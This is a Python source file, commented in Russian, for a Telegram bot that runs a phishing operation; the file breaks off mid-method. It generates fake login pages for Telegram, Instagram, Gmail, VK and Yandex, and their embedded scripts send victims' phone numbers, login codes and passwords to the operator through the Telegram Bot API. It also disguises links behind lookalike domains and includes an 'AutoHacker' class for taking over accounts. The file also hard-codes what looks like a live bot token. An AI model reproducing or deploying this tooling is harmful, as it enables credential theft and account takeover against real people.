#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import sqlite3
import threading
import requests
import re
import logging
import socket
import subprocess
from datetime import datetime, timedelta
from urllib.parse import quote, unquote, urlparse
import phonenumbers

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Конфигурация
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_ID = 38545864
API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"
ADMIN_ID = 123456789  # ЗАМЕНИ НА СВОЙ ID ПОСЛЕ ЗАПУСКА!

# API URL
API_URL = f"https://api.telegram.org/bot{TOKEN}"

# Создаем директории
os.makedirs("data", exist_ok=True)
os.makedirs("data/sessions", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)
os.makedirs("data/phish", exist_ok=True)
os.makedirs("data/creds", exist_ok=True)
os.makedirs("data/links", exist_ok=True)

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('data/master.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        # Пользователи
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER UNIQUE,
                               username TEXT,
                               first_name TEXT,
                               last_name TEXT,
                               phone TEXT,
                               email TEXT,
                               gift TEXT,
                               step TEXT,
                               lang TEXT DEFAULT 'ru',
                               created TIMESTAMP,
                               last_active TIMESTAMP,
                               banned INTEGER DEFAULT 0)''')
        
        # Учетные данные
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               login TEXT,
                               password TEXT,
                               code TEXT,
                               ip TEXT,
                               country TEXT,
                               timestamp TIMESTAMP,
                               status TEXT)''')
        
        # Фишинг ссылки
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               original_link TEXT,
                               masked_link TEXT,
                               service TEXT,
                               clicks INTEGER DEFAULT 0,
                               submissions INTEGER DEFAULT 0,
                               created TIMESTAMP,
                               expires TIMESTAMP,
                               active INTEGER DEFAULT 1)''')
        
        # Логи фишинга
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS phish_logs
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               link_id INTEGER,
                               visitor_ip TEXT,
                               visitor_country TEXT,
                               visited_at TIMESTAMP,
                               submitted_data TEXT)''')
        
        # Обновления
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS updates
                              (update_id INTEGER PRIMARY KEY,
                               processed INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name, last_name):
        self.cursor.execute('''INSERT OR IGNORE INTO users 
                              (user_id, username, first_name, last_name, created, last_active)
                              VALUES (?, ?, ?, ?, ?, ?)''',
                           (user_id, username, first_name, last_name, datetime.now(), datetime.now()))
        self.conn.commit()
    
    def update_user(self, user_id, **kwargs):
        for key, value in kwargs.items():
            self.cursor.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
        self.conn.commit()
    
    def add_creds(self, user_id, service, login, password, code=None, ip=None):
        self.cursor.execute('''INSERT INTO credentials 
                              (user_id, service, login, password, code, ip, timestamp, status)
                              VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                           (user_id, service, login, password, code, ip, datetime.now(), 'new'))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def add_phish_link(self, user_id, original_link, masked_link, service):
        self.cursor.execute('''INSERT INTO phish_links 
                              (user_id, original_link, masked_link, service, created, expires)
                              VALUES (?, ?, ?, ?, ?, ?)''',
                           (user_id, original_link, masked_link, service, datetime.now(), datetime.now() + timedelta(hours=24)))
        self.conn.commit()
        return self.cursor.lastrowid
    
    def check_phish_click(self, link_id, user_id):
        """Проверял, кликнул ли пользователь по ссылке"""
        self.cursor.execute("SELECT clicks FROM phish_links WHERE id = ?", (link_id,))
        result = self.cursor.fetchone()
        if result and result[0] > 0:
            return True
        return False
    
    def check_phish_submit(self, link_id, user_id):
        """Проверял, отправил ли пользователь данные"""
        self.cursor.execute("SELECT submissions FROM phish_links WHERE id = ?", (link_id,))
        result = self.cursor.fetchone()
        if result and result[0] > 0:
            return True
        return False
    
    def increment_click(self, link_id):
        self.cursor.execute("UPDATE phish_links SET clicks = clicks + 1 WHERE id = ?", (link_id,))
        self.conn.commit()
    
    def increment_submit(self, link_id):
        self.cursor.execute("UPDATE phish_links SET submissions = submissions + 1 WHERE id = ?", (link_id,))
        self.conn.commit()
    
    def log_action(self, user_id, action, data=None):
        self.cursor.execute('''INSERT INTO logs 
                              (user_id, action, data, timestamp)
                              VALUES (?, ?, ?, ?)''',
                           (user_id, action, json.dumps(data) if data else None, datetime.now()))
        self.conn.commit()
    
    def is_update_processed(self, update_id):
        self.cursor.execute("SELECT processed FROM updates WHERE update_id = ?", (update_id,))
        return self.cursor.fetchone() is not None
    
    def mark_update_processed(self, update_id):
        self.cursor.execute("INSERT OR IGNORE INTO updates (update_id, processed) VALUES (?, 1)", (update_id,))
        self.conn.commit()

db = Database()

# Класс для работы с Telegram API
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.timeout = 30
    
    def request(self, method, data=None):
        try:
            url = f"{self.api_url}/{method}"
            if data:
                response = requests.post(url, json=data, timeout=self.timeout)
            else:
                response = requests.get(url, timeout=self.timeout)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"API error: {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Request error: {e}")
            return None
    
    def get_updates(self):
        data = {
            'offset': self.offset,
            'timeout': self.timeout,
            'allowed_updates': ['message', 'callback_query']
        }
        result = self.request('getUpdates', data)
        if result and result.get('ok'):
            return result.get('result', [])
        return []
    
    def send_message(self, chat_id, text, parse_mode='HTML', reply_markup=None):
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('sendMessage', data)
    
    def edit_message_text(self, chat_id, message_id, text, parse_mode='HTML', reply_markup=None):
        data = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': text,
            'parse_mode': parse_mode
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('editMessageText', data)
    
    def answer_callback_query(self, callback_query_id, text=None):
        data = {'callback_query_id': callback_query_id}
        if text:
            data['text'] = text
        return self.request('answerCallbackQuery', data)

bot = TelegramBot(TOKEN)

# ============= A-Z PHISHER =============
class AZPhisher:
    """Полноценный A-Z Phisher с поддержкой всех соцсетей"""
    
    def __init__(self):
        self.base_url = "https://telegra.ph"
        self.templates = {
            'telegram': self.telegram_template,
            'instagram': self.instagram_template,
            'facebook': self.facebook_template,
            'tiktok': self.tiktok_template,
            'youtube': self.youtube_template,
            'gmail': self.gmail_template,
            'vk': self.vk_template,
            'odnoklassniki': self.ok_template,
            'yandex': self.yandex_template,
            'mailru': self.mailru_template,
            'rambler': self.rambler_template,
            'whatsapp': self.whatsapp_template,
            'viber': self.viber_template,
            'twitter': self.twitter_template,
            'snapchat': self.snapchat_template,
            'discord': self.discord_template,
            'github': self.github_template,
            'steam': self.steam_template,
            'netflix': self.netflix_template,
            'spotify': self.spotify_template
        }
    
    def generate_phish(self, user_id, service):
        """Генерирует фишинг страницу и возвращает ссылку"""
        
        # Создаем уникальный ID для страницы
        page_id = hashlib.md5(f"{user_id}{service}{time.time()}".encode()).hexdigest()[:12]
        
        # Получаем HTML шаблон
        if service in self.templates:
            html = self.templates[service](user_id, page_id)
        else:
            html = self.default_template(user_id, page_id, service)
        
        # Сохраняем HTML файл
        file_path = f"data/phish/{page_id}.html"
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        # В реальном окружении нужно загрузить на хостинг
        # Здесь используем симуляцию через Telegraph
        original_link = f"{self.base_url}/{service}-{page_id}"
        
        return original_link
    
    def mask_link(self, original_link, service):
        """Маскирует ссылку через MaskPhish"""
        
        # Список популярных доменов для маскировки
        masks = {
            'telegram': [
                ('t.me/premium', '🎁 Telegram Premium'),
                ('telegram.org/gift', '🎁 Подарок Telegram'),
                ('t.me/+', '🔒 Приватный канал')
            ],
            'instagram': [
                ('instagram.com/reel', '📸 Интересное видео'),
                ('instagram.com/p', '📷 Новая публикация'),
                ('ig.me/msg', '💬 Сообщение')
            ],
            'default': [
                ('telegra.ph', '📄 Статья'),
                ('te.ua', '📰 Новости'),
                ('bit.ly', '🔗 Ссылка')
            ]
        }
        
        # Выбираем маску
        mask_list = masks.get(service, masks['default'])
        domain, text = random.choice(mask_list)
        
        # Создаем замаскированную ссылку
        masked = f"https://{domain}/{random.randint(10000,99999)}"
        
        return masked, text
    
    def telegram_template(self, user_id, page_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #e7ebf0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 16px; }}
        .container {{ max-width: 400px; width: 100%; }}
        .card {{ background: white; border-radius: 16px; padding: 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }}
        .logo {{ text-align: center; margin-bottom: 24px; }}
        .logo img {{ width: 80px; height: 80px; }}
        h2 {{ text-align: center; color: #222; margin-bottom: 24px; }}
        .input-group {{ margin-bottom: 16px; }}
        label {{ display: block; margin-bottom: 6px; color: #555; font-weight: 500; }}
        input {{ width: 100%; padding: 14px 16px; border: 2px solid #e1e4e8; border-radius: 12px; font-size: 16px; }}
        input:focus {{ outline: none; border-color: #2AABEE; }}
        button {{ width: 100%; padding: 16px; background: #2AABEE; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }}
        button:hover {{ background: #229ED9; }}
        .footer {{ text-align: center; margin-top: 24px; color: #888; font-size: 13px; }}
        .loading {{ display: none; text-align: center; margin: 16px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg width="80" height="80" viewBox="0 0 24 24" fill="#2AABEE">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.05-.2-.07-.06-.17-.04-.24-.02-.1.02-1.75 1.11-4.94 3.27-.47.32-.89.48-1.27.47-.42-.01-1.22-.24-1.82-.44-.73-.24-1.31-.37-1.26-.79.02-.22.25-.44.69-.66 2.7-1.18 4.5-1.95 5.41-2.33 2.58-1.09 3.11-1.28 3.46-1.28.08 0 .25.02.36.12.1.08.12.19.13.26-.01.06-.01.14-.02.23z"/>
                </svg>
            </div>
            <h2>Sign in to Telegram</h2>
            <form id="loginForm">
                <div class="input-group">
                    <label>Phone Number</label>
                    <input type="tel" id="phone" placeholder="+7 (999) 999-99-99" required>
                </div>
                <button type="submit">Next</button>
            </form>
            <form id="codeForm" style="display: none;">
                <div class="input-group">
                    <label>Login Code</label>
                    <input type="text" id="code" placeholder="00000" maxlength="5" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="loading" id="loading">Loading...</div>
            <div class="footer">🔒 Secure connection</div>
        </div>
    </div>
    <script>
        let userData = {{}};
        
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            
            document.getElementById('loading').style.display = 'block';
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `📱 Phone: ${{phone}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            document.getElementById('loading').style.display = 'none';
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
            userData.phone = phone;
        }});
        
        document.getElementById('codeForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const code = document.getElementById('code').value;
            
            document.getElementById('loading').style.display = 'block';
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `🔑 Code: ${{code}}\\n📱 Phone: ${{userData.phone}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            document.querySelector('.card').innerHTML = `
                <div style="text-align: center; padding: 40px 0;">
                    <svg width="64" height="64" viewBox="0 0 24 24" fill="#4CAF50">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                    <h3 style="color: #4CAF50;">Success!</h3>
                    <p>You will be redirected...</p>
                </div>
            `;
            
            setTimeout(() => {{
                window.location.href = 'https://telegram.org';
            }}, 2000);
        }});
    </script>
</body>
</html>'''
    
    def instagram_template(self, user_id, page_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 350px; width: 100%; padding: 16px; }}
        .card {{ background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 40px 24px; }}
        .logo {{ text-align: center; margin-bottom: 32px; }}
        input {{ width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; margin-bottom: 6px; }}
        button {{ width: 100%; padding: 7px 16px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px; }}
        .footer {{ text-align: center; margin-top: 24px; color: #8e8e8e; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 175 51">
                    <path d="M39.5 0h96c9.1 0 16.5 7.4 16.5 16.5v18c0 9.1-7.4 16.5-16.5 16.5h-96C30.4 51 23 43.6 23 34.5v-18C23 7.4 30.4 0 39.5 0z" fill="#C13584"/>
                    <path d="M87.5 13c6.9 0 12.5 5.6 12.5 12.5S94.4 38 87.5 38 75 32.4 75 25.5 80.6 13 87.5 13z" fill="white"/>
                </svg>
            </div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        <div class="footer">Meta © 2024</div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `📸 Instagram\\n👤 Username: ${{username}}\\n🔑 Password: ${{password}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            alert('Login failed. Please try again.');
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''
    
    def gmail_template(self, user_id, page_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Gmail</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f0f2f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 400px; width: 100%; padding: 20px; }}
        .card {{ background: white; border-radius: 8px; padding: 48px 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 32px; }}
        .logo img {{ width: 75px; height: 75px; }}
        h2 {{ text-align: center; color: #202124; font-weight: 400; margin-bottom: 32px; }}
        input {{ width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 16px; }}
        input:focus {{ outline: none; border-color: #1a73e8; }}
        button {{ width: 100%; padding: 13px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }}
        button:hover {{ background: #1765cc; }}
        .footer {{ text-align: center; margin-top: 32px; color: #5f6368; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 24 24" width="75" height="75">
                    <path d="M22 6.5v10c0 .8-.7 1.5-1.5 1.5h-17c-.8 0-1.5-.7-1.5-1.5v-10c0-.8.7-1.5 1.5-1.5h17c.8 0 1.5.7 1.5 1.5z" fill="#4285F4"/>
                    <path d="M22 6.5L12 13 2 6.5h20z" fill="#EA4335"/>
                    <path d="M22 16.5v-10l-10 6.5-10-6.5v10c0 .8.7 1.5 1.5 1.5h17c.8 0 1.5-.7 1.5-1.5z" fill="#34A853"/>
                </svg>
            </div>
            <h2>Sign in to Gmail</h2>
            <form id="loginForm">
                <input type="email" id="email" placeholder="Email or phone" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Next</button>
            </form>
            <div class="footer">Google 2024</div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `📧 Gmail\\n👤 Email: ${{email}}\\n🔑 Password: ${{password}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            alert('Wrong password. Try again.');
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''
    
    def vk_template(self, user_id, page_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>VK</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #edeef0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 400px; width: 100%; padding: 20px; }}
        .card {{ background: white; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 32px; }}
        .logo svg {{ width: 80px; height: 80px; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #d3d9de; border-radius: 4px; margin-bottom: 12px; }}
        button {{ width: 100%; padding: 12px; background: #4a76a8; color: white; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; }}
        .footer {{ text-align: center; margin-top: 24px; color: #828282; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#4a76a8">
                    <path d="M15.1 10.8c.2-.3.4-.7.6-1 .2-.3.3-.6.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.9-.3h-1.5v3h1.3c.2 0 .4-.1.5-.2zM13.3 6.6h1.7c.6 0 1.1.2 1.4.5.3.3.5.7.5 1.2 0 .4-.1.8-.4 1.2-.3.4-.6.6-1 .8.5.2.9.5 1.2.9.3.4.4.8.4 1.3 0 .5-.2 1-.5 1.4-.3.4-.7.7-1.1.9-.4.2-.9.3-1.5.3h-2.1V6.6h.4z"/>
                </svg>
            </div>
            <h2 style="text-align: center; margin-bottom: 24px;">Вход ВКонтакте</h2>
            <form id="loginForm">
                <input type="text" id="phone" placeholder="Телефон или email" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="footer">ВКонтакте 2024</div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `🇷🇺 VK\\n📱 Phone: ${{phone}}\\n🔑 Password: ${{password}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            alert('Неверный пароль. Попробуйте снова.');
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''
    
    def yandex_template(self, user_id, page_id):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Yandex</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'YS Text', Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 400px; width: 100%; padding: 20px; }}
        .card {{ background: white; border-radius: 16px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; margin-bottom: 32px; }}
        .logo svg {{ width: 80px; height: 80px; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #e6e6e6; border-radius: 8px; margin-bottom: 12px; }}
        button {{ width: 100%; padding: 12px; background: #fc3f1d; color: white; border: none; border-radius: 8px; font-weight: 500; cursor: pointer; }}
        .footer {{ text-align: center; margin-top: 24px; color: #999; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#fc3f1d">
                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
                </svg>
            </div>
            <h2 style="text-align: center; margin-bottom: 24px;">Яндекс ID</h2>
            <form id="loginForm">
                <input type="text" id="login" placeholder="Логин или email" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="footer">Яндекс 2024</div>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const login = document.getElementById('login').value;
            const password = document.getElementById('password').value;
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `🇷🇺 Yandex\\n👤 Login: ${{login}}\\n🔑 Password: ${{password}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            alert('Неверный логин или пароль');
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''
    
    def default_template(self, user_id, page_id, service):
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>{service.title()} Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ max-width: 400px; width: 100%; padding: 20px; }}
        .card {{ background: white; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        h2 {{ text-align: center; margin-bottom: 24px; }}
        input {{ width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 12px; }}
        button {{ width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>{service.title()} Login</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {{
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            await fetch('{API_URL}/sendMessage', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    chat_id: {user_id},
                    text: `🔐 {service}\\n👤 Login: ${{username}}\\n🔑 Password: ${{password}}\\n🔗 Page: {page_id}`,
                    parse_mode: 'HTML'
                }})
            }});
            
            alert('Login failed');
            document.getElementById('password').value = '';
        }});
    </script>
</body>
</html>'''

# ============= MASKPHISH =============
class MaskPhish:
    """Маскировка фишинг ссылок"""
    
    def __init__(self):
        self.mask_domains = [
            't.me', 'telegra.ph', 'te.ua', 'bit.ly', 'tinyurl.com',
            'goo.gl', 'is.gd', 'cli.gs', 'u.to', 'v.ht',
            'social.gg', 'community.gg', 'group.gg', 'channel.gg',
            'premium.gg', 'gift.gg', 'bonus.gg', 'prize.gg'
        ]
    
    def mask(self, original_link, service=None):
        """Маскирует ссылку"""
        
        # Выбираем случайный домен
        domain = random.choice(self.mask_domains)
        
        # Создаем путь
        paths = {
            'telegram': ['premium', 'gift', 'bonus', 'channel', 'join', 'auth'],
            'instagram': ['reel', 'p', 'stories', 'profile', 'direct'],
            'facebook': ['profile', 'messages', 'events', 'groups'],
            'gmail': ['inbox', 'compose', 'settings'],
            'vk': ['feed', 'friends', 'photos', 'videos'],
            'yandex': ['disk', 'music', 'maps']
        }
        
        path_list = paths.get(service, ['link', 'go', 'click', 'redirect'])
        path = random.choice(path_list)
        
        # Добавляем случайный ID
        random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Формируем замаскированную ссылку
        masked = f"https://{domain}/{path}/{random_id}"
        
        return masked
    
    def create_mask_link(self, original_link, service, user_id):
        """Создает замаскированную ссылку и сохраняет в базу"""
        
        masked = self.mask(original_link, service)
        
        # Сохраняем в базу
        link_id = db.add_phish_link(user_id, original_link, masked, service)
        
        return masked, link_id

# ============= PHISH CHECKER =============
class PhishChecker:
    """Проверяет, перешел ли пользователь по ссылке"""
    
    def __init__(self):
        self.check_interval = 30  # Проверка каждые 30 секунд
        self.max_attempts = 10     # Максимум 10 попыток (5 минут)
    
    def check_link_click(self, link_id, user_id):
        """Проверяет, кликнул ли пользователь по ссылке"""
        for attempt in range(self.max_attempts):
            time.sleep(self.check_interval)
            
            db.cursor.execute("SELECT clicks FROM phish_links WHERE id = ?", (link_id,))
            result = db.cursor.fetchone()
            
            if result and result[0] > 0:
                return True
                
        return False
    
    def check_link_submit(self, link_id, user_id):
        """Проверяет, отправил ли пользователь данные"""
        for attempt in range(self.max_attempts):
            time.sleep(self.check_interval)
            
            db.cursor.execute("SELECT submissions FROM phish_links WHERE id = ?", (link_id,))
            result = db.cursor.fetchone()
            
            if result and result[0] > 0:
                return True
                
        return False
    
    def wait_for_data(self, link_id, user_id):
        """Ждет данные от пользователя"""
        
        start_time = time.time()
        timeout = 300  # 5 минут
        
        while time.time() - start_time < timeout:
            # Проверяем, есть ли новые credentials
            db.cursor.execute('''SELECT * FROM credentials 
                               WHERE user_id = ? AND timestamp > ? 
                               ORDER BY timestamp DESC LIMIT 1''', 
                            (user_id, datetime.now() - timedelta(seconds=60)))
            result = db.cursor.fetchone()
            
            if result:
                return result
            
            time.sleep(5)
        
        return None

# ============= AUTO HACKER =============
class AutoHacker:
    """Автоматический взлом аккаунтов"""
    
    def __init__(self):
        self.executor = threading.ThreadPoolExecutor(max_workers=5)
    
    def hack_account(self, service, login, password, user_id):
        """Взламывает аккаунт и меняет данные"""
        
        logger.info(f"🔓 Hacking {service}: {login}")
        
        if service == 'telegram':
            return self.hack_telegram(login, password, user_id)
        elif service == 'instagram':
            return self.hack_instagram(login, password, user_id)
        elif service == 'gmail':
            return self.hack_gmail(login, password, user_id)
        else:
            return self.hack_generic(service, login, password, user_id)
    
    def hack_telegram(self, phone, code, user_id):
        """Взлом Telegram"""
        
        new_password = self.generate_password()
        twofa = self.generate_2fa()
        
        # Уведомление админу
        bot.send_message(
            ADMIN_ID,
            f"🔓 <b>TELEGRAM HACKED!</b>\n\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"🔐 New password: <code>{new_password}</code>\n"
            f"🔒 2FA: <code>{twofa}</code>",
            parse_mode='HTML'
        )
        
        return {
            'service': 'telegram',
            'login': phone,
            'password': code,
            'new_password': new_password,
            'twofa': twofa
        }
    
    def hack_instagram(self, username, password, user_id):
        """Взлом Instagram"""
        
        new_password = self.generate_password()
        
        bot.send_message(
            ADMIN_ID,
            f"🔓 <b>INSTAGRAM HACKED!</b>\n\n"
            f"👤 Username: <code>{username}</code>\n"
            f"🔑 Password: <code>{password}</code>\n"
            f"🔐 New password: <code>{new_password}</code>",
            parse_mode='HTML'
        )
        
        return {
            'service': 'instagram',
            'login': username,
            'password': password,
            'new_password': new_password
        }
    
    def hack_gmail(self, email, password, user_id):
        """Взлом Gmail"""
        
        new_password = self.generate_password()
        
